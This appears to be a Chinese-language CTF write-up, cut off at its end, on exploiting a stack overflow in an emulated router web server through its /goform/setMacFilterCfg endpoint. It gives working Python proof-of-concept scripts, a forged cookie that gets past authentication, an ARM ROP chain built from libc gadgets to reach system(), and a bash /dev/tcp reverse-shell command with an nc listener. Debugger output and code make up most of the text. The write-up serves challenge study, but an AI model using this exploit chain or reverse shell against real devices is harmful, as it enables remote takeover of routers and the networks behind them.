<h3 id="sub-2E128"><a href="#sub-2E128" class="headerlink" title="sub_2E128"></a>sub_2E128</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">signed</span> <span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">sub_2E128</span><span class="hljs-params">(<span class="hljs-type">int</span> a1, <span class="hljs-type">int</span> a2)</span><br>&#123;<br>  ...<br>  init_core_dump(v2);<br>  v3 = <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\nYes:\n\n      ****** WeLoveLinux****** \n\n Welcome to ...&quot;</span>);<br>  sub_305FC(v3);<br>  v4 = sleep(<span class="hljs-number">1u</span>);<br>  v5 = ConnectCfm(v4);<br>  sub_100D8(<span class="hljs-number">0</span>, <span class="hljs-number">61440</span>, <span class="hljs-number">1</span>, v5);<br>  <span class="hljs-built_in">memset</span>(&amp;s, <span class="hljs-number">0</span>, <span class="hljs-number">0x80</span>u);<br>  <span class="hljs-keyword">if</span> ( !GetValue(<span class="hljs-string">&quot;lan.webiplansslen&quot;</span>, &amp;s) )<br>    <span class="hljs-built_in">strcpy</span>(&amp;s, <span class="hljs-string">&quot;0&quot;</span>);<br>  sslenable = atoi(&amp;s);<br>  <span class="hljs-keyword">if</span> ( !GetValue(<span class="hljs-string">&quot;lan.webport&quot;</span>, &amp;s) )<br>    <span class="hljs-built_in">strcpy</span>(&amp;s, <span class="hljs-string">&quot;80&quot;</span>);<br>  <span class="hljs-keyword">if</span> ( !GetValue(<span class="hljs-string">&quot;lan.webipen&quot;</span>, &amp;dest) )<br>    <span class="hljs-built_in">strcpy</span>(&amp;dest, <span class="hljs-string">&quot;0&quot;</span>);<br>  <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strcmp</span>((<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)&amp;dest, <span class="hljs-string">&quot;1&quot;</span>) )<br>  &#123;<br>    sslport = atoi(&amp;s);<br>    port = atoi(&amp;s);<br>  &#125;<br>  v6 = getLanIfName();<br>  <span class="hljs-keyword">if</span> ( getIfIp(v6, &amp;v21) &lt; <span class="hljs-number">0</span> )<br>  &#123;<br>    GetValue(<span class="hljs-string">&quot;lan.ip&quot;</span>, &amp;s);<br>    <span class="hljs-built_in">strcpy</span>(g_lan_ip, &amp;s);<br>    <span class="hljs-built_in">memset</span>(&amp;v17, <span class="hljs-number">0</span>, <span class="hljs-number">0x50</span>u);<br>    <span class="hljs-keyword">if</span> ( !tpi_lan_dhcpc_get_ipinfo_and_status(&amp;v17) &amp;&amp; v17 )<br>      vos_strcpy(g_lan_ip, &amp;v17);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    vos_strcpy(g_lan_ip, &amp;v21);<br>  &#125;<br>  <span class="hljs-built_in">memset</span>(&amp;v19, <span class="hljs-number">0</span>, <span class="hljs-number">9u</span>);<br>  v7 = inet_addr(g_lan_ip);<br>  v19 = (<span class="hljs-type">unsigned</span> __int8)v19 | (v7 &lt;&lt; <span class="hljs-number">8</span>);<br>  v20 = HIBYTE(v7);<br>  tpi_talk_to_kernel(<span class="hljs-number">5</span>, &amp;v19, &amp;v18, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, v15, v16);<br>  sub_2EA60(<span class="hljs-number">1</span>);<br>  sub_2EA60(<span class="hljs-number">0</span>);<br>  getpid();<br>  doSystemCmd(<span class="hljs-string">&quot;echo %d &gt; %s&quot;</span>);<br>  <span class="hljs-keyword">if</span> ( sub_2E6F4() &gt;= <span class="hljs-number">0</span> ) <span class="hljs-comment">// call our func</span><br>  &#123;<br>    <span class="hljs-built_in">memset</span>(&amp;loginUserInfo, <span class="hljs-number">0</span>, <span class="hljs-number">0x6C</span>u);<br>    signal(<span class="hljs-number">15</span>, (<span class="hljs-type">__sighandler_t</span>)sub_2DEC0);<br>    signal(<span class="hljs-number">9</span>, (<span class="hljs-type">__sighandler_t</span>)sub_2DEC0);<br>    signal(<span class="hljs-number">14</span>, (<span class="hljs-type">__sighandler_t</span>)sub_2DF48);<br>    alarm(<span class="hljs-number">0x3C</span>u);<br>    v35 = <span class="hljs-number">0</span>;<br>    mallopt(<span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    mallopt(<span class="hljs-number">-3</span>, <span class="hljs-number">2048</span>);<br>    v9 = getpid();<br>    v34 = v9;<br>    <span class="hljs-keyword">while</span> ( !dword_FD1C0 )<br>    &#123;<br>      v10 = sub_1BFF4(<span class="hljs-number">-1</span>, <span class="hljs-number">1000</span>);<br>      <span class="hljs-keyword">if</span> ( v10 &gt; <span class="hljs-number">0</span> )<br>        v10 = sub_1C4F0(<span class="hljs-number">-1</span>);<br>      v11 = sub_11570(v10);<br>      v9 = sub_2DD68(v11);<br>      <span class="hljs-keyword">if</span> ( !(++v35 % <span class="hljs-number">100</span>) )<br>        v9 = malloc_trim(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( sslenable )<br>    &#123;<br>      v12 = sub_1EF9C(v9);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      v13 = sub_2940C(v9);<br>      v12 = sub_1B47C(v13);<br>    &#125;<br>    sub_10258(v12);<br>    v8 = <span class="hljs-number">0</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;main -&gt; initWebs failed&quot;</span>);<br>    v8 = <span class="hljs-number">-1</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> v8;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="触发链"><a href="#触发链" class="headerlink" title="触发链"></a>触发链</h3><p>sub_2E128 -&gt; sub_2E6F4 -&gt;sub_41F18 -&gt; formSetMacFilterCfg -&gt; sub_BD758 -&gt; sub_BDA1C -&gt; sub_BE73C</p>
<p>那么现在我们就可以访问“&#x2F;goform&#x2F;setMacFilterCfg”时会进入formSetMacfiltercfg函数，传入类似与json的数据进行解析，则会将value值传入漏洞触发点。</p>
<h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><p>post 数据, rur &#x3D; ‘&#x2F;goform&#x2F;setMacFilterCfg’</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;macFilterType&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;white&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;deviceList&quot;</span><span class="hljs-punctuation">:</span> payload<span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>



<h2 id="漏洞调试"><a href="#漏洞调试" class="headerlink" title="漏洞调试"></a>漏洞调试</h2><h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h3><p>编写qemu-arm启动脚本</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br>brctl addbr br0<br>ifconfig br0 10.10.10.10 up<br>qemu-arm-static -g 1234 -L ./pwn ./pwn/httpd<br></code></pre></td></tr></table></figure>

<p>启动log</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">┌[logan☮arch]-(~/share/nu1l/babyroute/docker)<br>└&gt; sudo ./start.sh <br>[sudo] password for logan: <br>init_core_dump 1816: rlim_cur = -1, rlim_max = -1<br>init_core_dump 1825: open core dump success<br>init_core_dump 1834: rlim_cur = 5242880, rlim_max = 5242880<br><br>Yes:<br><br>      ****** WeLoveLinux****** <br><br> Welcome to ...<br>connect: No such file or directory<br>Connect to server failed.<br>connect: No such file or directory<br>Connect to server failed.<br>connect: No such file or directory<br>Connect to server failed.<br>connect: No such file or directory<br>Connect to server failed.<br>create socket  fail -1<br>connect: No such file or directory<br>Connect to server failed.<br>connect: No such file or directory<br>Connect to server failed.<br>connect: No such file or directory<br>Connect to server failed.<br>connect: No such file or directory<br>Connect to server failed.<br>[httpd][debug]----------------------------webs.c,157<br>httpd listen ip = 10.10.10.10 port = 80<br>webs: Listening for HTTP requests at address 10.10.10.10<br><br></code></pre></td></tr></table></figure>



<p>启动后gdb远程调试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">gdb-multiarch<br></code></pre></td></tr></table></figure>

<p>设置 架构为arm</p>
<p>远程调试端口为1234</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">pwndbg&gt; set architecture arm<br>The target architecture is set to &quot;arm&quot;.<br>pwndbg&gt; target remote 127.0.0.1:1234<br>Remote debugging using 127.0.0.1:1234<br></code></pre></td></tr></table></figure>

<p>在漏洞函数0xC2FD4处下短点</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">pwndbg&gt; b *0xC2FD4<br>Breakpoint 1 at 0xc2fd4<br></code></pre></td></tr></table></figure>



<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#! /usr/bin/python3</span><br><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://10.10.10.10/goform/setMacFilterCfg&quot;</span><br>p = <span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">0x1000</span><br>d = &#123;<span class="hljs-string">&quot;macFilterType&quot;</span>: <span class="hljs-string">&quot;white&quot;</span>, <span class="hljs-string">&quot;deviceList&quot;</span>: <span class="hljs-string">&#x27;\r&#x27;</span>+ <span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">0x1000</span>&#125;<br>r = requests.post(url, d)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure>



<p>log输出如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">┌[logan☮arch]-(~/share/nu1l/babyroute)<br>└&gt; python poc<br>&#123;&quot;errCode&quot;:2&#125;<br></code></pre></td></tr></table></figure>

<p>发现不能运行到我们的位置，进行再调试调试看看是那块没有绕过。重新下断电在formSetMacFilterCfg函数，偏移为: 000BCB9C</p>
<p>发现能够调用到formSetMacFilterCfg函数，但没法继续调用下一个函数，再来分析分析还有什么条件没有绕过。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs asm">  0xbd3a0    sub    r3, fp, #0x24<br>  0xbd3a4    ldr    r2, [pc, #0x36c]<br>  0xbd3a8    add    r2, r4, r2<br>  0xbd3ac    mov    r0, r2<br>  0xbd3b0    mov    r1, r3<br>► 0xbd3b4    bl     #0xf2f8 &lt;0xf2f8&gt;<br><br>  0xbd3b8    mov    r3, r0<br>  0xbd3bc    cmp    r3, #0<br>  0xbd3c0    beq    #0xbd458 &lt;0xbd458&gt;<br><br></code></pre></td></tr></table></figure>

<p>执行到GetValue的时候， 会出现http响应错误，然而该函数是调用lib的，只能先分析一下lib。</p>
<p>通过分析lib中的GetValue函数，会议cookie值检测，需要包含password等字段，内容随便伪造。</p>
<p>poc如下</p>
<h3 id="触发poc"><a href="#触发poc" class="headerlink" title="触发poc"></a>触发poc</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#! /usr/bin/python3</span><br><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://10.10.10.10/goform/setMacFilterCfg&quot;</span><br>c = &#123;<span class="hljs-string">&quot;Cookie&quot;</span>:<span class="hljs-string">&quot;password=0&quot;</span>&#125;<br>p = <span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">0x1000</span><br>d = &#123;<span class="hljs-string">&quot;macFilterType&quot;</span>: <span class="hljs-string">&quot;black&quot;</span>, <span class="hljs-string">&quot;deviceList&quot;</span>: <span class="hljs-string">&#x27;\r&#x27;</span>+ <span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">0x1000</span>&#125;<br>r = requests.post(url, cookies = c, data = d)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure>

<p>漏洞触发如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">*R0   0x0<br>*R1   0x3ffef110 ◂— 0<br>*R2   0x3ff4c020 ◂— stm    r0!, &#123;r5&#125;<br>*R3   0x0<br>*R4   0x41414141 (&#x27;AAAA&#x27;)<br> R5   0x11bf40 ◂— str    r7, [r5, #0x70] /* 0x666f672f; &#x27;/goform/setMacFilterCfg&#x27; */<br> R6   0x1<br> R7   0x408007fb ◂— 0x41414141 (&#x27;AAAA&#x27;)<br> R8   0xe968 ◂— stm    r0!, &#123;r0, r2, r3&#125;<br> R9   0x2e128 ◂— ldr    r0, [pc, #0x40]<br> R10  0x40800668 ◂— 0x41414141 (&#x27;AAAA&#x27;)<br>*R11  0x41414141 (&#x27;AAAA&#x27;)<br>*R12  0x3ff47edc —▸ 0x3ff3da50 ◂— adds   r0, #0<br>*SP   0x40800098 ◂— 0x41414141 (&#x27;AAAA&#x27;)<br>*PC   0x41414140 (&#x27;@AAA&#x27;)<br>───────────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────────<br>Invalid address 0x41414140<br><br></code></pre></td></tr></table></figure>

<p>这时发现，已经修改了PC寄存器，实现了劫持。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>接下来就计算便宜找system函数了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">─────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────<br> R0   0x407fffe4 ◂— 0x0<br> R1   0x11ee31 ◂— &#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCC&#x27;<br> R2   0x407fffe4 ◂— 0x0<br> R3   0x11ee31 ◂— &#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCC&#x27;<br> R4   0xfab18 —▸ 0xfa9d0 ◂— 1<br> R5   0x11c0e0 ◂— strbtvs r6, [pc], -pc, lsr #14 /* 0x666f672f; &#x27;/goform/setMacFilterCfg&#x27; */<br> R6   0x1<br> R7   0x408007fb ◂— &#x27;./pwn/httpd&#x27;<br> R8   0xe968 ◂— mov    ip, sp<br> R9   0x2e128 ◂— push   &#123;r4, fp, lr&#125;<br> R10  0x40800668 ◂— 0x0<br> R11  0x407ffe94 —▸ 0xbdb80 ◂— sub    r3, fp, #0x1d0<br> R12  0xfaf60 —▸ 0x3fdda508 ◂— mov    r3, r0<br> SP   0x407ffe50 ◂— 0x0<br>*PC   0xbe9a4 ◂— bl     #0xf640<br>──────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────<br>   0xbe990    bl     #0xf640 &lt;0xf640&gt;<br> <br>   0xbe994    ldr    r2, [fp, #-0x3c]<br>   0xbe998    ldr    r3, [fp, #-0x10]<br>   0xbe99c    mov    r0, r2<br>   0xbe9a0    mov    r1, r3<br> ► 0xbe9a4    bl     #0xf640 &lt;0xf640&gt;<br><br></code></pre></td></tr></table></figure>





<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">65:0194│ r0    0x407fffe4 ◂— &#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCC&#x27;<br>... ↓<br>74:01d0│       0x40800020 ◂— &#x27;BBBBCCCC&#x27;<br>75:01d4│       0x40800024 ◂— &#x27;CCCC&#x27;<br>76:01d8│ r3-1  0x40800028 ◂— 0x0<br>... ↓<br>8d:0234│       0x40800084 ◂— 0x1f<br>8e:0238│       0x40800088 —▸ 0xf0bc8 ◂— ldmdbvs r6!, &#123;r2, r5, r6, r8, sl, sp, lr&#125; ^ /* &#x27;deviceList&#x27; */<br></code></pre></td></tr></table></figure>

<p>堆栈数据如上，由于是如下进行弹堆栈的，需要再填充(0x238 - 0x1d4)个字节才可以修爱pc寄存器，实现劫持。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">.text:000BE9AC                 MOV             R0, R3<br>.text:000BE9B0                 SUB             SP, R11, #8<br>.text:000BE9B4                 LDMFD           SP!, &#123;R4,R11,PC&#125;<br></code></pre></td></tr></table></figure>





<p>重新修改poc</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#! /usr/bin/python3</span><br><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://10.10.10.10/goform/setMacFilterCfg&quot;</span><br>c = &#123;<span class="hljs-string">&quot;Cookie&quot;</span>:<span class="hljs-string">&quot;password=0&quot;</span>&#125;<br>p = <span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">0xA8</span><br>p += <span class="hljs-string">&#x27;DDDD&#x27;</span><br>p += <span class="hljs-string">&#x27;EEEE&#x27;</span><br>p += <span class="hljs-string">&#x27;FFFF&#x27;</span><br><br>d = &#123;<span class="hljs-string">&quot;macFilterType&quot;</span>: <span class="hljs-string">&quot;black&quot;</span>, <span class="hljs-string">&quot;deviceList&quot;</span>: <span class="hljs-string">&#x27;\r&#x27;</span>+ p&#125;<br>r = requests.post(url, cookies = c, data = d)<br></code></pre></td></tr></table></figure>

<p>运行如下，那么就可以知道在哪可以实现修改pc寄存器了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">*R11  0x45454545 (&#x27;EEEE&#x27;)<br>*R12  0x3ff47edc —▸ 0x3ff3da50 ◂— mov    r3, r0<br>*SP   0x40800098 ◂— &#x27;GGGGHHHH&#x27;<br>*PC   0x46464646 (&#x27;FFFF&#x27;)<br>──────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────<br>Invalid address 0x46464646<br><br></code></pre></td></tr></table></figure>

<p>由于程序没有开启alsr与pie那么glibc中的基址是固定的。</p>
<p>直接算获取system地址。vmmap获取glibc基址为<code>0xf659b000</code></p>
<p>在libc中找到system函数偏移</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">┌[logan☮arch]-(~/share/nu1l/babyroute)<br>└&gt; readelf -s docker/pwn/lib/libc.so.0  | grep system<br>   433: 0005a270   348 FUNC    WEAK   DEFAULT    7 system<br>   904: 00047b38    80 FUNC    GLOBAL DEFAULT    7 svcerr_systemerr<br>  1394: 0005a270   348 FUNC    GLOBAL DEFAULT    7 __libc_syste<br></code></pre></td></tr></table></figure>





<p>这里记得检查下CPSR寄存器的T位，因为栈上内容弹出到PC寄存器时，其最低有效位（LSB）将被写入CPSR寄存器的T位，而PC本身的LSB被设置为0。如果T位值为1，需要在地址上加一还原。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">pwndbg&gt; p/t $cpsr<br>$1 = 1100000000000000000000000010000<br>pwndbg&gt; cyclic -l taab<br>176<br></code></pre></td></tr></table></figure>



<h3 id="寻找gadgets"><a href="#寻找gadgets" class="headerlink" title="寻找gadgets"></a>寻找gadgets</h3><p>gadget1</p>
<p>用于修改r3寄存器</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">┌[logan☮arch]-(~/share/nu1l/babyroute)<br>└&gt; ROPgadget --binary docker/pwn/lib/libc.so.0 --only &quot;pop&quot; | grep r3<br>...<br>0x00018298 : pop &#123;r3, pc&#125;<br>...<br></code></pre></td></tr></table></figure>



<p>gadget2</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">┌[logan☮arch]-(~/share/nu1l/babyroute)<br>└&gt; ROPgadget --binary ./docker/pwn/lib/libc.so.0  | grep &quot;mov r0, sp ; blx r3&quot;<br>...<br>0x00040cb8 : mov r0, sp ; blx r3<br>...<br></code></pre></td></tr></table></figure>



<p>payload结构为[offset, gadget1, system_addr, gadget2, cmd] </p>
<p>先将system函数地址储存在r3寄存器中，执行到gadget2将sp的值赋给r0，也就是将sp作为system的参数，而这时sp指向的是cmd。</p>
<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#! /usr/bin/python3</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>url = <span class="hljs-string">&quot;http://10.10.10.10/goform/setMacFilterCfg&quot;</span><br>c = &#123;<span class="hljs-string">&quot;Cookie&quot;</span>:<span class="hljs-string">&quot;password=0&quot;</span>&#125;<br>libc_base = <span class="hljs-number">0xf659b000</span><br>system  = libc_base + <span class="hljs-number">0x0005a270</span><br>gadget1 = libc_base + <span class="hljs-number">0x00018298</span><br>gadget2 = libc_base + <span class="hljs-number">0x00040cb8</span><br>cmd = <span class="hljs-string">b&#x27;touch test\x00&#x27;</span><br><br>p = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0xA8</span><br>p += <span class="hljs-string">b&#x27;DDDD&#x27;</span><br>p += <span class="hljs-string">b&#x27;EEEE&#x27;</span><br>p += p32(gadget1)<br>p += p32(system)<br>p += p32(gadget2)<br>p += cmd<br><br>d = &#123;<span class="hljs-string">&quot;macFilterType&quot;</span>: <span class="hljs-string">&quot;black&quot;</span>, <span class="hljs-string">&quot;deviceList&quot;</span>: <span class="hljs-string">&#x27;\r&#x27;</span>+ p&#125;<br>r = requests.post(url, cookies = c, data = d)<br><br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure>

<p>修改url 为docker所转发的端口，现在试试在docker上是否已经创建test文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">root@a52d03d064d3:/# ls<br>bin   dev  flag  lib    media  opt   pwn   run   srv       sys   tmp  var<br>boot  etc  home  lib64  mnt    proc  root  sbin  start.sh  test  usr<br></code></pre></td></tr></table></figure>

<p>可以看到已经创建了test文件。</p>
<p>那么如何实现交互呢?就采用bash下来反弹sehll 吧。</p>
<p>先在自己的服务器上使用nc来监听。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">nc -lvnp 4444<br></code></pre></td></tr></table></figure>

<p>在poc中的命令填写为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">bash -i &gt;&amp; /dev/tcp/192.168.43.13/4444 0&gt;&amp;1<br></code></pre></td></tr></table></figure>

<p>192.168.43.13是我物理机的ip,4444是我nc监听的端口。</p>
<p>现在poc为</p>
